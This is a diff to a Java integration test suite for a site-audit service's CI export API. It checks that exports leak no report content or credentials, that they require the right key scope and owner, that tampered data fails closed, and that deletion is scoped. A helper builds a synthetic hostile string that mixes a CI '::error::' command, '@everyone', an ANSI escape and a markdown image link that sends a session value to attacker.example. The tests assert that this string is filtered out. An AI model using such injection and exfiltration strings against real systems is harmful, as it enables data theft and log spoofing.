@@ -47,7 +47,7 @@ class CiAdmissionIT extends MariaDbReportFixture {
         runDao=new AuditRunDao(tx,usage);runs=new AuditRunService(runDao,tokens,mapper);rates=new CiRateService(dao,tokens,clock);
         transport=mock(DiscoveryTransport.class);
         ci=new CiAdmissionService(keys,targets,entitlement,new CiQuotaService(runDao,entitlement,policy,new UsagePolicy(config),rates,tokens,clock),
-            new CiRequestDao(tx),runs,dao,transport,mapper,tokens,clock);
+            new CiRequestDao(tx),runs,dao,transport,mapper,tokens,clock,ReportRetentionPolicy.defaults());
     }
     private long user(String email) throws Exception {
         var user=dao.transaction(c->{var u=new AccountUser();u.setEmail(email);u.setDisplayName("CI fixture");u.setState("ACTIVE");u.setRole("USER");u.setOffer("PREMIUM");u.setCreatedAt(clock.instant());return dao.save(u,c);});
@@ -61,6 +61,111 @@ class CiAdmissionIT extends MariaDbReportFixture {
     private CiErrorCode code(WebApplicationException e){return ((CiErrors.Envelope)e.getResponse().getEntity()).error().code();}
     private CiAdmissionService.Creation admit(String intention,int count){return ci.create(auth(),"fixture",intention,input(count));}
     private long runId(CiAdmissionService.Creation created){return Long.parseLong(created.admission().runs().getFirst().id());}
+    private String hostile(){return "synthetic-private-736 @everyone ::error:: ![remote](https://attacker.example/private?session=hidden) \u001b[31m "+key.credential();}
+    private long publishPrivate() throws Exception {
+        long run=runId(admit(UUID.randomUUID().toString(),1));
+        assertTrue(runDao.claimRun(run,"export-worker",clock.instant()));
+        var report=mapper.createObjectNode();report.put("domain","example.com");report.put("url","https://example.com");
+        report.putObject("site").put("title",hostile()).put("logoUrl","https://attacker.example/private");
+        var issues=report.putArray("issues");
+        for(String id:List.of("http.security.csp","http.security.csp","html.title","zap.alert.unknown")) {
+            var issue=issues.addObject();issue.put("id",id);issue.put("categoryKey","security");
+            issue.put("severity","critical");issue.put("title",hostile());issue.put("evidence",hostile());issue.put("recommendation",hostile());
+        }
+        var dto=mapper.treeToValue(report,ReportDto.class);var composer=mock(PublicReportComposer.class);
+        when(composer.compose(any())).thenReturn(dto);
+        var summaries=mock(AiReportSummaryService.class);var ratings=mock(AhrefsDomainRatingClient.class);
+        var privatePublisher=new ReportPublishService(dao.transactions,runDao,reports,composer,summaries,ratings,mapper);
+        var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
+        sql("UPDATE ARG_AUDIT_RUN SET report_token_hash=UNHEX(SHA2('synthetic-ci-private-known',256)) WHERE id="+run);
+        privatePublisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),mapper.writeValueAsString(Map.of("console",hostile(),"headers",hostile())),"export-worker");
+        verifyNoInteractions(summaries,ratings);return run;
+    }
+    @Test void detailedExportsAndStorageContainNoTargetContentOrCredential() throws Exception {
+        long run=publishPrivate();var export=ci.export(auth(),"fixture",run);
+        assertEquals("details-v1",export.kind());assertEquals(2,export.details().findings().size());assertEquals(1,export.details().omittedFindings());
+        assertEquals("/api/ci/v1/runs/"+run+"/report",export.reportPath());
+        String output=mapper.writeValueAsString(export);
+        for(String marker:List.of("synthetic-private-736",key.credential(),"@everyone","::error::","attacker.example","session=hidden","evidence","console","Authorization"))
+            assertFalse(output.contains(marker),marker.equals(key.credential())?"credential":marker);
+        var stored=reports.findByRunId(run).orElseThrow();assertEquals("{}",stored.getReportJson());assertNull(stored.getDiagnosticJson());
+        assertNull(stored.getLogoUrl());assertNull(stored.getSiteTitle());assertNull(runs.getRun(run).orElseThrow().getResultJson());
+        assertFalse(stored.getCiExportJson().contains("synthetic-private-736"));
+        assertTrue(reports.findByTokenHash(tokens.sha256("synthetic-ci-private-known")).isEmpty());
+        assertTrue(reader.getByToken("synthetic-ci-private-known").isEmpty());
+        var editor=new AccountReportIntroductionService(sessions,mapper,clock,tokens);
+        assertThrows(AccountError.class,()->editor.read(browser,"synthetic-ci-private-known"));
+        assertThrows(AccountError.class,()->editor.publish(browser,CSRF,"synthetic-ci-private-known",mock(ReportIntroduction.class)));
+        var history=new AccountHistoryService(dao,sessions,mapper,clock);
+        var sites=new AccountSitesService(dao,sessions,null,null,null,clock);
+        var followed=dao.transaction(c->sites.follow(owner,1L,c));
+        assertThrows(AccountError.class,()->history.reportContext(browser,"synthetic-ci-private-known"));
+        assertTrue(history.history(browser,followed.getId(),20,null).items().isEmpty());
+        var site=sites.list(browser,20,null).items().getFirst();
+        assertNull(site.latestRunStatus());assertNull(sites.urls(browser,Long.parseLong(site.siteId()),20,null).items().getFirst().latestAvailableReport());
+        var personal=new AccountRunReadDao(dao.transactions);
+        assertTrue(dao.transaction(c->personal.owned(run,owner,c)).isEmpty());
+    }
+    @Test void exportsRequireCurrentKeyScopeOwnerIntegrationAndEntireOriginalOriginScope() throws Exception {
+        long run=publishPrivate();
+        var other=issue(browser,target,List.of("results:read"));
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+other.credential(),"fixture",run))));
+        String foreignBrowser=login(user("export-other@example.com"));var foreign=issue(foreignBrowser,verified(foreignBrowser),List.of("results:read"));
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+foreign.credential(),"fixture",run))));
+        var writeOnly=issue(browser,target,List.of("audits:write"));
+        assertEquals(CiErrorCode.PERMISSION_DENIED,code(assertThrows(WebApplicationException.class,()->ci.export("Bearer "+writeOnly.credential(),"fixture",run))));
+        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(browser,"fixture",run))));
+        keys.revoke(browser,CSRF,key.key().id(),"fixture");
+        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+        String otherTarget=targets.create(browser,CSRF,"https://www.example.com","fixture").target().id();targets.verify(browser,CSRF,otherTarget,"fixture");
+        key=keys.create(browser,CSRF,new CiKeysService.Input("Replacement",List.of("results:read"),List.of(otherTarget),key.key().integrationId(),null),"fixture");
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+    }
+    @Test void expiredMissingOversizedAndTamperedExportsFailClosedWithoutRawFallback() throws Exception {
+        long run=publishPrivate();var q=QAuditReport.auditReport;String saved=reports.findByRunId(run).orElseThrow().getCiExportJson();
+        for(String invalid:List.of(saved.substring(0,saved.length()-1)+",\"raw\":\"synthetic-private-736\"}", "{\"console\":\"synthetic-private-736\"}")) {
+            dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson,invalid).where(q.runId.eq(run)).execute();return null;});
+            var failure=assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run));
+            assertEquals(CiErrorCode.INTERNAL_ERROR,code(failure));assertFalse(mapper.writeValueAsString(failure.getResponse().getEntity()).contains("synthetic-private-736"));
+        }
+        dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson," ".repeat(50000)).where(q.runId.eq(run)).execute();return null;});
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+        dao.transaction(c->{dao.transactions.update(q,c).set(q.ciExportJson,(String)null).where(q.runId.eq(run)).execute();return null;});
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+        sql("UPDATE ARG_AUDIT_REPORT SET created_at='2026-09-17',expires_at='2030-01-01' WHERE run_id="+run);
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report(auth(),"fixture",run))));
+    }
+    @Test void rotationPreservesHistoricalReadsButNarrowerReplacementCannotReadTheOriginalWiderScope() throws Exception {
+        String second=targets.create(browser,CSRF,"https://www.example.com","fixture").target().id();targets.verify(browser,CSRF,second,"fixture");
+        String integration=key.key().integrationId();keys.revoke(browser,CSRF,key.key().id(),"fixture");
+        key=keys.create(browser,CSRF,new CiKeysService.Input("Both targets",List.of("audits:write","results:read"),List.of(target,second),integration,null),"fixture");
+        long run=publishPrivate();key=keys.rotate(browser,CSRF,key.key().id(),"fixture");assertEquals("details-v1",ci.export(auth(),"fixture",run).kind());
+        // Revoke both the overlap and the current credential before replacing the stable slot.
+        for(var view:keys.list(browser,0).items())if(view.integrationId().equals(integration) && view.revokedAt()==null)keys.revoke(browser,CSRF,view.id(),"fixture");
+        key=keys.create(browser,CSRF,new CiKeysService.Input("Narrow",List.of("results:read"),List.of(target),integration,null),"fixture");
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.report(auth(),"fixture",run))));
+        keys.revoke(browser,CSRF,key.key().id(),"fixture");
+        key=keys.create(browser,CSRF,new CiKeysService.Input("Both restored",List.of("results:read"),List.of(target,second),integration,null),"fixture");
+        sql("UPDATE ARG_ACCOUNT_USER SET offer='FREE' WHERE id="+owner);
+        assertEquals("details-v1",ci.export(auth(),"fixture",run).kind());
+        var q=QCiApiKey.table;dao.transaction(c->{dao.transactions.update(q,c).set(q.expiresAt,clock.instant().minusSeconds(1)).where(q.publicId.eq(key.key().id())).execute();return null;});
+        assertEquals(CiErrorCode.AUTHENTICATION_FAILED,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+    }
+    @Test void deletionIsScopedIdempotentAndPreservesUsageAndOriginalIntention() throws Exception {
+        String intention=UUID.randomUUID().toString();var first=admit(intention,1);long run=runId(first);
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.deleteReport(auth(),"fixture",run))));
+        assertTrue(runDao.claimRun(run,"delete-worker",clock.instant()));
+        var audit=new Audit();audit.setId(1L);audit.setNormalizedUrl("https://example.com");
+        publisher.completeAndPublish(run,audit,mock(com.dokor.argos.services.analysis.model.AuditReportJson.class),"{}","delete-worker");
+        var readOnly=issue(browser,target,List.of("results:read"));
+        assertEquals(CiErrorCode.PERMISSION_DENIED,code(assertThrows(WebApplicationException.class,()->ci.deleteReport("Bearer "+readOnly.credential(),"fixture",run))));
+        assertTrue(ci.deleteReport(auth(),"fixture",run).deleted());assertTrue(ci.deleteReport(auth(),"fixture",run).deleted());
+        assertTrue(reports.findByRunId(run).isEmpty());assertNull(runs.getRun(run).orElseThrow().getReportTokenHash());
+        assertEquals("COUNTED",dao.transactions.selectQuery().select(QUsageRun.table.state).from(QUsageRun.table).where(QUsageRun.table.id.eq(run)).fetchOne());
+        assertFalse(admit(intention,1).created());assertEquals(first.admission().id(),ci.byKey(auth(),"fixture",intention).id());
+        assertEquals(CiErrorCode.RESOURCE_NOT_AVAILABLE,code(assertThrows(WebApplicationException.class,()->ci.export(auth(),"fixture",run))));
+    }
     @Test void lostResponseRotationAndDowngradeRecoverTheSameIntentionWithoutAnotherReservation() throws Exception {
         String intention=UUID.randomUUID().toString();var first=admit(intention,2);assertTrue(first.created());
         assertFalse(admit(intention,2).created());assertEquals(2,ci.usage(auth(),"fixture").usage().reserved());
@@ -180,6 +285,23 @@ class CiAdmissionIT extends MariaDbReportFixture {
             }
             var report=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/report")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());
             assertEquals(200,report.statusCode(),report.body());assertEquals("summary-v1",mapper.readTree(report.body()).path("kind").asText());
+            var other=issue(browser,target,List.of("results:read"));
+            String otherBrowser=login(user("http-export-other@example.com"));
+            var foreign=issue(otherBrowser,verified(otherBrowser),List.of("results:read"));
+            for(String credential:List.of("",browser,"Bearer synthetic-ci-http-known","Bearer "+other.credential(),"Bearer "+foreign.credential(),auth())) {
+                var builder=HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/export"));
+                if(!credential.isEmpty())builder.header("Authorization",credential);
+                var exported=client.send(builder.GET().build(),HttpResponse.BodyHandlers.ofString());
+                int expected=credential.equals(auth())?200:credential.equals("Bearer "+other.credential()) || credential.equals("Bearer "+foreign.credential())?404:401;
+                assertEquals(expected,exported.statusCode());
+                assertEquals("private, no-store",exported.headers().firstValue("cache-control").orElseThrow());
+                assertEquals("no-referrer",exported.headers().firstValue("referrer-policy").orElseThrow());
+                assertFalse(exported.body().contains(key.credential()));assertFalse(exported.body().contains("synthetic-ci-http-known"));
+            }
+            var deleted=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/report")).header("Authorization",auth()).DELETE().build(),HttpResponse.BodyHandlers.ofString());
+            assertEquals(200,deleted.statusCode());assertTrue(mapper.readTree(deleted.body()).path("deleted").asBoolean());
+            var gone=client.send(HttpRequest.newBuilder(URI.create(base+"/ci/v1/runs/"+run+"/export")).header("Authorization",auth()).GET().build(),HttpResponse.BodyHandlers.ofString());
+            assertEquals(404,gone.statusCode());
         }finally{server.shutdownNow();}
     }
 }
